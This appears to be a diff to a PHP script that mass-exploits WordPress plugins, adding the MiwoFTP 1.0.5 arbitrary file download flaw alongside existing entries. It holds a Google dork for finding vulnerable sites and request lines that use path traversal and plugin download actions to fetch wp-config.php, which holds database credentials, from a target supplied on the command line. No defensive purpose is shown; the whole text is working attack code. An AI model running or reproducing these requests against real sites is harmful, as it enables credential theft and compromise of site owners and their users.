@@ -151,6 +151,11 @@
 # Vendor Homepage:: https://wordpress.org/plugins/wp-mon/
 # Google Dork: inurl:"/wp-content/plugins/wp-mon"
 # ------------------------------------------------------------------------------
+#
+# Wordpress MiwoFTP Plugin 1.0.5 suffers from arbitrary file download vulnerability
+# Vendor Homepage:: http://www.miwisoft.com
+# Google Dork: inurl:"php?page=miwoftp"
+# ------------------------------------------------------------------------------
 # http://i.imgur.com/45BFlNe.png
 # ===============================================================================
 
@@ -253,6 +258,8 @@ __request($argv[1], '/wp-content/plugins/aspose-cloud-ebook-generator/aspose_pos
 __request($argv[1], '/wp-content/themes/mTheme-Unus/css/css.php?files=../../../../wp-config.php');
 
 __request($argv[1], '/wp-content/plugins/wp-mon/assets/download.php?type=octet/stream&path=../../../../&name=wp-config.php');
+
+__request($argv[1], '/wp-admin/admin.php?page=miwoftp&option=com_miwoftp&action=download&dir=/&item=wp-config.php&order=name&srt=yes');
 
 function __request($url, $plugin) {
 
